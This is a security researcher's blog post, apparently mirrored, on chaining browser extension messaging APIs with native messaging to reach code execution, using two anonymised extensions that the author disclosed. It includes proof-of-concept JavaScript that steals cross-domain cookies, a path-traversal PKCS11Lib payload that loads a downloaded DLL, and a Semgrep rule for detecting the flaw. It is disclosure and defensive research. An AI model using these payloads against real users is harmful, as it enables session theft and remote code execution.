<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://spaceraccoon.dev/universal-code-execution-browser-extensions/">Original</a>
    <h1>Universal Code Execution by Chaining Messages in Browser Extensions</h1>
    
    <div id="readability-page-1" class="page"><div>
<section id="single">

<p><time datetime="2024-07-07 12:01:06 +0000 UTC">Jul 7, 2024</time>
<span>
·
</span>
<span>
2111 words
</span>
<span>
·
</span>
<span>
10 minute read
</span>
</p>
<div>
<p>By chaining various messaging APIs in browsers and browser extensions, I demonstrate how we can jump from web pages to “universal code execution”, breaking both Same Origin Policy and the browser sandbox. I provide two new vulnerability disclosures affecting millions of users as examples. In addition, I demonstrate how such vulnerabilities can be discovered at scale with a combination of large dataset queries and static code analysis.</p>
<p>Note: The extension case studies were disclosed to their owners in April, but haven’t been patched and are thus censored.</p>
<p>Universal cross-site scripting (XSS) has been described as “the most powerful XSS” because of its ability to execute on any webpage (hence “universal”) and break Same Origin Policy in some cases. The reason for this is that the vulnerability lies in the browser or a browser extension, allowing it to extend beyond a single origin’s scope.</p>
<p>However, thanks to the ever-growing capabilities of browser extension APIs and dangerously-implemented native messaging protocols, a far more impactful vulnerability can exploited - universal code execution. As observed by Arseny Reutov as early as 2017 in <a href="https://owasp.org/www-chapter-london/assets/slides/OWASPLondon_PostMessage_Security_in_Chrome_Extensions.pdf" target="_blank" rel="noopener">“PostMessage Security in Chrome Extensions”</a>, there’s a way to relay messages from a web page all the way to native applications, and not much has improved since then. Unfortunately, one fact of vulnerability research is that you only realise halfway through that another researcher has taken the same track before, but it’s still worth revisiting old techniques to see if they still apply.</p>
<p>Often, browser extensions need to execute JavaScript in the context of the page a user is visiting. For example, a browser may modify the document object model (DOM) of a page. These extensions must declare <em>content scripts</em> in their <a href="https://developer.chrome.com/docs/extensions/develop/concepts/content-scripts" target="_blank" rel="noopener"><code>manifest.json</code> file</a>, for example:</p>
<div><pre tabindex="0"><code data-lang="json"><span><span><span>&#34;content_scripts&#34;</span><span>:</span> [
</span></span><span><span>  {
</span></span><span><span>    <span>&#34;js&#34;</span>: [
</span></span><span><span>      <span>&#34;js/contentscript.js&#34;</span>
</span></span><span><span>    ],
</span></span><span><span>    <span>&#34;matches&#34;</span>: [
</span></span><span><span>      <span>&#34;http://*/*&#34;</span>,
</span></span><span><span>      <span>&#34;https://*/*&#34;</span>
</span></span><span><span>    ],
</span></span><span><span>    <span>&#34;all_frames&#34;</span>: <span>true</span>
</span></span><span><span>  }
</span></span><span><span>]
</span></span></code></pre></div><p>In this case, the <code>js/contentscript.js</code> script in the extension will be injected into all frames in any pages matching the pattern. While ideally the pattern would be tightly restricted to specific pages, it’s common to see generic extensions using catchall wildcards like the example.</p>
<p>This is of course an extremely powerful capability, which is why content scripts are placed in <a href="https://developer.chrome.com/docs/extensions/develop/concepts/content-scripts#isolated_world" target="_blank" rel="noopener">private execution environments called “isolated worlds”</a>, greatly limiting the damage that could occur if, for example, a DOM XSS exists in a content script. Content scripts cannot access JavaScript variables on the web page or other injected content scripts and operate within a separate <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Content_Security_Policy#default_content_security_policy" target="_blank" rel="noopener">default content security policy</a> which prevents inline JavaScript execution.</p>
<p>As such, in order to execute more complex functionality beyond modifying the page DOM, a content script must pass messages to its extension’s <em>background script</em> or <em>service worker</em> that run in a <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Background_scripts#dom_apis" target="_blank" rel="noopener">separate page context</a>. One common pattern is that these background scripts act as event handlers to messages passed from content scripts which contain information about loaded web pages.</p>
<p>To do so, the content script can use several APIs to communicate with the background script. One common method is via <a href="https://developer.chrome.com/docs/extensions/develop/concepts/messaging" target="_blank" rel="noopener"><code>chrome.runtime.sendMessage()</code></a>.</p>
<p>For example, the content script executes the following:</p>
<div><pre tabindex="0"><code data-lang="javascript"><span><span><span>await</span> chrome.runtime.sendMessage({greeting<span>:</span> <span>&#34;hello&#34;</span>});
</span></span></code></pre></div><p>While the background script waits with the message handler:</p>
<div><pre tabindex="0"><code data-lang="javascript"><span><span>chrome.runtime.onMessage.addListener(
</span></span><span><span>  <span>function</span>(request, sender, sendResponse) {
</span></span><span><span>    console.log(sender.tab <span>?</span>
</span></span><span><span>                <span>&#34;from a content script:&#34;</span> <span>+</span> sender.tab.url <span>:</span>
</span></span><span><span>                <span>&#34;from the extension&#34;</span>);
</span></span><span><span>    <span>if</span> (request.greeting <span>===</span> <span>&#34;hello&#34;</span>)
</span></span><span><span>      sendResponse({farewell<span>:</span> <span>&#34;goodbye&#34;</span>});
</span></span><span><span>  }
</span></span><span><span>);
</span></span></code></pre></div><p>While cross-extension messaging is possible, most extensions only allow message passing between their own content scripts and background scripts. Unfortunately, as hinted earlier, there are many ways in which malicious web pages can barge into this conversation.</p>
<p>One common vulnerable pattern in extension content scripts is lack of origin validation in <code>postMessage</code> handlers.</p>
<p><code>postMessage</code> is a separate messaging mechanism from <code>sendMessage</code>, often used for cross-window/tab messaging by web pages, not extensions. However, it provides a convenient way for extension developers to allow web pages to communicate with the isolated content script and in turn the background script. In fact, <a href="https://developer.chrome.com/docs/extensions/develop/concepts/content-scripts" target="_blank" rel="noopener">this is a recommended pattern by Chrome’s own developer documentation</a>.</p>
<p>For example, consider a simple use case in which a web page wants to check the version of the extension. Recall that content scripts operate in an isolated world and cannot access JavaScript variables in the web page they are embedded in. However, content scripts still share access to the page’s DOM and can thus receive <code>postMessage</code> messages.</p>
<p>The web page could run the following:</p>
<div><pre tabindex="0"><code data-lang="javascript"><span><span><span>document</span>.getElementById(<span>&#34;checkInstalledButton&#34;</span>).addEventListener(<span>&#34;click&#34;</span>, () =&gt; {
</span></span><span><span>  <span>window</span>.postMessage(
</span></span><span><span>      {type<span>:</span> <span>&#34;CHECK_INSTALLED_VERSION&#34;</span>, latestVersion<span>:</span> <span>&#34;1.2.3&#34;</span> }, <span>&#34;*&#34;</span>);
</span></span><span><span>}, <span>false</span>);
</span></span></code></pre></div><p>While the content script listens for the message:</p>
<div><pre tabindex="0"><code data-lang="javascript"><span><span><span>var</span> port <span>=</span> chrome.runtime.connect();
</span></span><span><span>
</span></span><span><span><span>window</span>.addEventListener(<span>&#34;message&#34;</span>, (event) =&gt; {
</span></span><span><span>  <span>// We only accept messages from ourselves
</span></span></span><span><span><span></span>  <span>if</span> (event.source <span>!==</span> <span>window</span>) {
</span></span><span><span>    <span>return</span>;
</span></span><span><span>  }
</span></span><span><span>
</span></span><span><span>  <span>if</span> (event.data.type <span>&amp;&amp;</span> (event.data.type <span>===</span> <span>&#34;CHECK_INSTALLED_VERSION&#34;</span>)) {
</span></span><span><span>    console.log(<span>&#34;Content script received: &#34;</span> <span>+</span> event.data.type);
</span></span><span><span>    port.postMessage(event.data);
</span></span><span><span>  }
</span></span><span><span>}, <span>false</span>);
</span></span></code></pre></div><p>Notably, the protection offered by the event source check is completely nullified if the content script is injected with a wildcard <code>matches</code> pattern, since this means any origin can still trigger this web page-content script-background script channel simply by sending a postMessage to itself.</p>
<p>
<img src="https://spaceraccoon.dev/images/31/browser-extension-message-chain.png" alt="Browser Extension Message Chain"/>
</p>
<p>By exploiting the trust boundary between content scripts and background scripts, malicious web pages can easily break Same Origin Policy protections using the expanded capabilities of a vulnerable extension.</p>
<p>One example is “Extension A” with 300,000 users which “provides enhanced user experience” for <code>https://website-a.com</code>. However the extension manifest injects content scripts on every page, not just <code>https://website-a.com</code>:</p>
<div><pre tabindex="0"><code data-lang="json"><span><span><span>&#34;content_scripts&#34;</span><span>:</span> [
</span></span><span><span>  {
</span></span><span><span>    <span>&#34;js&#34;</span>: [
</span></span><span><span>      <span>&#34;js/jquery-3.2.1.min.js&#34;</span>,
</span></span><span><span>      <span>&#34;js/contentscript.js&#34;</span>,
</span></span><span><span>    ],
</span></span><span><span>    <span>&#34;matches&#34;</span>: [
</span></span><span><span>      <span>&#34;http://*/*&#34;</span>,
</span></span><span><span>      <span>&#34;https://*/*&#34;</span>
</span></span><span><span>    ],
</span></span><span><span>    <span>&#34;all_frames&#34;</span>: <span>true</span>
</span></span><span><span>  }
</span></span></code></pre></div><p>In addition, the extension has permissions to access the cookies of multiple other origins:</p>
<div><pre tabindex="0"><code data-lang="json"><span><span><span>&#34;permissions&#34;</span><span>:</span> [
</span></span><span><span>  <span>&#34;cookies&#34;</span>,
</span></span><span><span>  <span>&#34;webRequest&#34;</span>,
</span></span><span><span>  <span>&#34;webRequestBlocking&#34;</span>,
</span></span><span><span>  <span>&#34;https://website-a.com/*&#34;</span>,
</span></span><span><span>  <span>&#34;https://website-b.com/*&#34;</span>,
</span></span><span><span>  <span>&#34;https://*.website-c.com/*&#34;</span>
</span></span><span><span>]
</span></span></code></pre></div><p>Utilising the same embedding page commuication pattern, the background script accepts the following message type that simply returns all cookies for the requested domain:</p>
<div><pre tabindex="0"><code data-lang="javascript"><span><span>chrome.runtime.onMessage.addListener(<span>function</span>(a, b, c) {
</span></span><span><span>  <span>switch</span> (a.Action) {
</span></span><span><span>    <span>// ...
</span></span></span><span><span><span></span>    <span>case</span> <span>&#34;GETCOOKIE&#34;</span><span>:</span>
</span></span><span><span>        GetCookie(a, b.tab.id);
</span></span><span><span>        <span>break</span>;
</span></span><span><span>    <span>// ...
</span></span></span><span><span><span></span>
</span></span><span><span><span>function</span> GetCookie(a, b) {
</span></span><span><span>    chrome.cookies.getAll({
</span></span><span><span>        domain<span>:</span> a.URL
</span></span><span><span>    }, <span>function</span>(c) {
</span></span><span><span>        <span>var</span> d <span>=</span> [];
</span></span><span><span>        $(c).each(<span>function</span>() {
</span></span><span><span>            d.push({
</span></span><span><span>                name<span>:</span> <span>this</span>.name,
</span></span><span><span>                value<span>:</span> <span>this</span>.value,
</span></span><span><span>                domain<span>:</span> <span>this</span>.domain,
</span></span><span><span>                secure<span>:</span> <span>this</span>.secure,
</span></span><span><span>                path<span>:</span> <span>this</span>.path
</span></span><span><span>            })
</span></span><span><span>        });
</span></span><span><span>        a.Data <span>=</span> JSON.stringify(d);
</span></span><span><span>        SendMessage(<span>&#34;ONRESULT&#34;</span>, a, b)
</span></span><span><span>    })
</span></span><span><span>}
</span></span></code></pre></div><p>Therefore, any webpage from any domain that includes the following script can trigger the extension to return session cookies from the whitelisted domains back to the page:</p>
<div><pre tabindex="0"><code data-lang="javascript"><span><span><span>function</span> runPoc() {           
</span></span><span><span>    <span>const</span> payload <span>=</span> {
</span></span><span><span>        Action<span>:</span> <span>&#34;GETCOOKIE&#34;</span>,
</span></span><span><span>        background<span>:</span> <span>true</span>,
</span></span><span><span>        URL<span>:</span> <span>&#34;website-a.com&#34;</span>
</span></span><span><span>    }
</span></span><span><span>    <span>window</span>.postMessage(payload, <span>&#39;*&#39;</span>);          
</span></span><span><span>}
</span></span><span><span>setTimeout(runPoc, <span>1000</span>)
</span></span></code></pre></div><p>This is effectively a Same Origin Policy breakout, since a malicious page on <a href="https://example.com" target="_blank" rel="noopener">https://example.com</a> can now access the cookies of <a href="https://website-a.com" target="_blank" rel="noopener">https://website-a.com</a>.</p>
<p>However, to go beyond existing research and web-only impact, we can turn to another browser extension capability: native messaging. This allows background scripts to communicate with <em>native applications</em> running on the host operating system itself. For example, password manager extensions that retrieve passwords from the native password manager application on the desktop.</p>
<p>These native applications must declare a <em>native messaging host manifest file</em> that is then referenced by the browser when starting the application.</p>
<div><pre tabindex="0"><code data-lang="json"><span><span>{
</span></span><span><span>  <span>&#34;name&#34;</span>: <span>&#34;com.my_company.my_application&#34;</span>,
</span></span><span><span>  <span>&#34;description&#34;</span>: <span>&#34;My Application&#34;</span>,
</span></span><span><span>  <span>&#34;path&#34;</span>: <span>&#34;C:\\Program Files\\My Application\\chrome_native_messaging_host.exe&#34;</span>,
</span></span><span><span>  <span>&#34;type&#34;</span>: <span>&#34;stdio&#34;</span>,
</span></span><span><span>  <span>&#34;allowed_origins&#34;</span>: [<span>&#34;chrome-extension://knldjmfmopnpolahpmmgbagdohdnhkik/&#34;</span>]
</span></span><span><span>}
</span></span></code></pre></div><p>Once started, the browser will handle passing messages from the extension to the process specified by <code>path</code> using <code>stdin</code> and <code>stdout</code>. The background script can then send a message using <code>chrome.runtime.sendNativeMessage()</code>:</p>
<div><pre tabindex="0"><code data-lang="javascript"><span><span>chrome.runtime.sendNativeMessage(
</span></span><span><span>  <span>&#39;com.my_company.my_application&#39;</span>,
</span></span><span><span>  {text<span>:</span> <span>&#39;Hello&#39;</span>},
</span></span><span><span>  <span>function</span> (response) {
</span></span><span><span>    console.log(<span>&#39;Received &#39;</span> <span>+</span> response);
</span></span><span><span>  }
</span></span><span><span>);
</span></span></code></pre></div><p>Meanwhile, the native application can handle the <code>stdin</code> message any way it wants - sometimes dangerously.</p>
<p>We thus have a complete chain for universal code execution:</p>
<ol>
<li>Browser extension has a wildcard pattern for content script.</li>
<li>Content script passes <code>postMessage</code> messages to the background script using <code>sendMessage</code>.</li>
<li>Background script passes the message to native application using <code>sendNativeMessage</code>.</li>
<li>Native application handles the message dangerously, leading to code execution.</li>
</ol>
<p>
<img src="https://spaceraccoon.dev/images/31/native-message-chain.png" alt="Native Message Chain"/>
</p>
<p>Given the somewhat narrow requirements of this chain, it may be daunting to find such extensions. However, thanks to the <a href="https://github.com/palant/chrome-extension-manifests-dataset" target="_blank" rel="noopener">chrome-extension-manifests-dataset</a> project, it’s possible to quickly query hundreds of thousands of Chrome extensions for matching manifests.</p>
<p>Querying all Chrome extensions with user counts greater than 250,000, include content scripts, and use native messaging can be done like so:</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span>node query.js -f <span>&#34;metadata.user_count &gt; 250000&#34;</span> <span>&#34;manifest.content_scripts?.length &gt; 0 &amp;&amp; manifest.permissions?.includes(&#39;nativeMessaging&#39;)&#34;</span>
</span></span></code></pre></div><p>At this point, it may not be helpful to filter out for wildcard content script match patterns, since this can be expressed in multiple ways, including <a href="https://developer.chrome.com/docs/extensions/develop/concepts/match-patterns" target="_blank" rel="noopener"><code>&lt;all_urls&gt;</code></a>. This yields about 229 candidates, which can be narrowed down further using a Semgrep custom code scanning rule to find vulnerable <code>postMessage</code> handlers.</p>
<div><pre tabindex="0"><code data-lang="yaml"><span><span><span>rules</span>:<span>
</span></span></span><span><span><span></span>- <span>id</span>:<span> </span>content-script-postmessage-to-chrome-runtime-sendmessage<span>
</span></span></span><span><span><span>  </span><span>mode</span>:<span> </span>taint<span>
</span></span></span><span><span><span>  </span><span>options</span>:<span>
</span></span></span><span><span><span>    </span><span>interfile</span>:<span> </span><span>true</span><span>
</span></span></span><span><span><span>  </span><span>message</span>:<span> </span>Content script postmessage handler forwards data to chrome runtime.<span>
</span></span></span><span><span><span>  </span><span>languages</span>:<span>
</span></span></span><span><span><span>  </span>- javascript<span>
</span></span></span><span><span><span>  </span>- typescript<span>
</span></span></span><span><span><span>  </span><span>severity</span>:<span> </span>ERROR<span>
</span></span></span><span><span><span>  </span><span>pattern-sources</span>:<span>
</span></span></span><span><span><span>    </span>- <span>patterns</span>:<span>
</span></span></span><span><span><span>        </span>- <span>pattern-inside</span>:<span> </span>window.addEventListener(&#39;message&#39;, function($EVENT) { ... }, ...)<span>
</span></span></span><span><span><span>        </span>- <span>pattern-not</span>:<span> </span>... if (&lt;... $EVENT.origin ...&gt;) { ... } ...<span>
</span></span></span><span><span><span>        </span>- <span>focus-metavariable</span>:<span> </span>$EVENT<span>
</span></span></span><span><span><span>  </span><span>pattern-sinks</span>:<span>
</span></span></span><span><span><span>    </span>- <span>pattern</span>:<span> </span>$CHROME_RUNTIME.sendMessage(...)<span>
</span></span></span><span><span><span>    </span>- <span>pattern</span>:<span> </span>port.postMessage(...)<span>
</span></span></span></code></pre></div><h2 id="command-execution-in-smart-card-extensions">Command Execution in Smart Card Extensions <a href="#command-execution-in-smart-card-extensions">🔗</a></h2><p>One common use for native messaging in extensions in PKI (Public Key Infrastructure) Smart Card-related functionality. PKI smart cards are traditionally used for passwordless authentication, but are not natively supported by browsers, which largely support the WebAuthn standard instead for FIDO2 and passkeys.</p>
<p>Thus, in order to fill this gap, webpages that want to use PKI Smart Card authentication rely on browser extensions that communicate with native applications that interface with the Smart Cards. Given the large number of enterprise websites that still rely on PKI smart cards, these extensions have a surprisingly large user base.</p>
<p>One such extension is the Extension B with 2 million users. As of the latest version, the extension injects its content script in all pages. Unfortunately, given the nature of this extension, it’s “by-design” to allow for PKI smart card functionality to run on any page.</p>
<div><pre tabindex="0"><code data-lang="json"><span><span><span>&#34;content_scripts&#34;</span><span>:</span> [ {
</span></span><span><span>  <span>&#34;all_frames&#34;</span>: <span>true</span>,
</span></span><span><span>  <span>&#34;js&#34;</span>: [ <span>&#34;content.js&#34;</span> ],
</span></span><span><span>  <span>&#34;matches&#34;</span>: [ <span>&#34;*://*/*&#34;</span>, <span>&#34;file:///*&#34;</span> ],
</span></span><span><span>  <span>&#34;run_at&#34;</span>: <span>&#34;document_start&#34;</span>
</span></span><span><span>} ]
</span></span></code></pre></div><p>The content script listens for messages and passes them to the background script. While there appears to be a source check, it’s actually taken from the message data itself which can be directly controlled by the sender.</p>
<div><pre tabindex="0"><code data-lang="javascript"><span><span><span>window</span>.addEventListener(<span>&#34;message&#34;</span>, <span>function</span>(event) {
</span></span><span><span>    <span>// We only accept messages from ourselves
</span></span></span><span><span><span></span>    <span>if</span> (event.source <span>!==</span> <span>window</span>)
</span></span><span><span>        <span>return</span>;
</span></span><span><span>
</span></span><span><span>    <span>if</span> (event.data.src <span>&amp;&amp;</span> (event.data.src <span>===</span> <span>&#34;user_page.js&#34;</span>)) {
</span></span><span><span>        event.data[<span>&#34;origin&#34;</span>] <span>=</span> location.origin;
</span></span><span><span>        <span>if</span> (SDLogToConsole) {
</span></span><span><span>            console.log(<span>&#34;From page: &#34;</span>);
</span></span><span><span>            console.log(event.data);
</span></span><span><span>        }
</span></span><span><span>        <span>//Send Message to Extension
</span></span></span><span><span><span></span>        chrome.runtime.sendMessage(event.data, <span>function</span>(resp) {});
</span></span><span><span>    }
</span></span><span><span>});
</span></span></code></pre></div><p>In turn, the background script passes the message directly to the native application.</p>
<div><pre tabindex="0"><code data-lang="javascript"><span><span><span>var</span> port <span>=</span> chrome.runtime.connectNative(<span>&#34;example.b.chrome.host&#34;</span>);
</span></span><span><span>
</span></span><span><span>chrome.runtime.onMessage.addListener(
</span></span><span><span>  <span>function</span>(request, sender, sendResponse) {
</span></span><span><span>    console.log(sender.tab <span>?</span>
</span></span><span><span>                <span>&#34;from a content script:&#34;</span> <span>+</span> sender.tab.url <span>:</span>
</span></span><span><span>                <span>&#34;From the extension&#34;</span>);	
</span></span><span><span>   <span>if</span> (port <span>==</span> <span>null</span> )
</span></span><span><span>   {
</span></span><span><span>	chrome.windows.create({url<span>:</span> <span>&#34;popup.html&#34;</span>, type<span>:</span><span>&#34;popup&#34;</span>, top<span>:</span><span>100</span>, left<span>:</span><span>100</span>, width<span>:</span><span>630</span>,height<span>:</span><span>320</span>});
</span></span><span><span>	<span>return</span> <span>true</span>;
</span></span><span><span>   }
</span></span><span><span>   port.postMessage(request);	
</span></span><span><span>   <span>return</span> <span>true</span>;
</span></span><span><span>  });
</span></span></code></pre></div><p>So how does the native application handle the message? First, we must identify the application associated with <code>example.b.chrome.host</code>. The extension’s website provides the corresponding native app for various operating systems. Some integration source code is also provided and the binary itself is a .NET assembly.</p>
<p>From there, one can identify the message parsing code which parses the <code>stdin</code> as a JSON object which includes an <code>action</code> key. For the <code>GetCertLib</code> action, it takes the value of the <code>PKCS11Lib</code> item in the JSON object and eventually passes it to a function that loads the DLL at the <code>PKCS11Lib</code> path.</p>
<div><pre tabindex="0"><code data-lang="csharp"><span><span><span>public</span> <span>static</span> TxnRespWithObj&lt;List&lt;X509Certificate2&gt;&gt; EnumerateSCCertificates(<span>string</span> PKCS11Lib)
</span></span><span><span>    {
</span></span><span><span>      List&lt;X509Certificate2&gt; x509Certificate2List = <span>new</span> List&lt;X509Certificate2&gt;();
</span></span><span><span>      TxnRespWithObj&lt;List&lt;X509Certificate2&gt;&gt; txnRespWithObj1;
</span></span><span><span>      <span>try</span>
</span></span><span><span>      {
</span></span><span><span>        <span>string</span> str = <span>&#34;C:\\Windows\\System32\\&#34;</span> + PKCS11Lib;
</span></span><span><span>        <span>if</span> (!File.Exists(str))
</span></span><span><span>          <span>return</span> <span>new</span> TxnRespWithObj&lt;List&lt;X509Certificate2&gt;&gt;()
</span></span><span><span>          {
</span></span><span><span>            IsSuccess = <span>false</span>,
</span></span><span><span>            TxnOutcome = <span>&#34;Required Smartcard driver &#34;</span> + str + <span>&#34; not found. Install token drivers and try again.&#34;</span>
</span></span><span><span>          };
</span></span><span><span>        <span>using</span> (IPkcs11Library pkcs11Library = PKCS11SCUnlock.Factories.Pkcs11LibraryFactory.LoadPkcs11Library(PKCS11SCUnlock.Factories, str, AppType.MultiThreaded))
</span></span></code></pre></div><p>This is a very common traversal pattern for DLL loading that I also exploited in <a href="https://spaceraccoon.dev/zscaler-client-connector-local-privilege-escalation/" target="_blank" rel="noopener">ZScaler Client Connector</a>.</p>
<p>Therefore, by first triggering a download of a malicious DLL file followed by sending a message with the <code>GetCertLib</code> action and <code>PKCS11Lib</code> pointing to the download location, an attacker can jump from any web page to full command execution, so long as the victim has installed the extension and the matching native application.</p>
<div><pre tabindex="0"><code data-lang="html"><span><span>&lt;<span>script</span>&gt;
</span></span><span><span>    <span>// Function to handle incoming postMessage events
</span></span></span><span><span><span></span>    <span>function</span> receiveMessage(event) {
</span></span><span><span>        <span>// Access the data sent from the other window/iframe
</span></span></span><span><span><span></span>        <span>const</span> receivedData <span>=</span> event.data;
</span></span><span><span>
</span></span><span><span>        <span>// Create a new paragraph element to display the message
</span></span></span><span><span><span></span>        <span>const</span> newMessage <span>=</span> <span>document</span>.createElement(<span>&#39;p&#39;</span>);
</span></span><span><span>        newMessage.textContent <span>=</span> JSON.stringify(receivedData);
</span></span><span><span>
</span></span><span><span>        <span>// Append the new message to the message container
</span></span></span><span><span><span></span>        <span>const</span> messageContainer <span>=</span> <span>document</span>.getElementById(<span>&#39;messageContainer&#39;</span>);
</span></span><span><span>        messageContainer.appendChild(newMessage);
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>// Add event listener to listen for postMessage events
</span></span></span><span><span><span></span>    <span>window</span>.addEventListener(<span>&#39;message&#39;</span>, receiveMessage);
</span></span><span><span>
</span></span><span><span><span>function</span> runPoc() {
</span></span><span><span><span>window</span>.postMessage({src<span>:</span> <span>&#39;user_page.js&#39;</span>, action<span>:</span> <span>&#39;GetCertLib&#39;</span>, PKCS11Lib<span>:</span> <span>&#39;..\\..\\..\\..\\..\\Users\\James\\Downloads\\payload.txt&#39;</span>}, <span>&#34;*&#34;</span>)
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>function</span> downloadPayload() {
</span></span><span><span>  <span>const</span> downloadLink <span>=</span> <span>document</span>.getElementById(<span>&#39;download&#39;</span>);
</span></span><span><span>  downloadLink.click()
</span></span><span><span>  setTimeout(runPoc, <span>2000</span>);
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span>setTimeout(downloadPayload, <span>2000</span>);
</span></span><span><span>&lt;/<span>script</span>&gt;
</span></span></code></pre></div><h2 id="conclusion">Conclusion <a href="#conclusion">🔗</a></h2><p>In this paper, I demonstrate how to extend browser extension messaging chains with native messaging to achieve “universal code execution”. With large datasets and static code analysis automation, it’s possible to find large numbers of exploitable extensions with large userbases. The nature of some extensions using this pattern makes it difficult to secure at the source and must thus be carefully handled at every link in the chain.</p>
</div>

</section>
</div></div>
  </body>
</html>
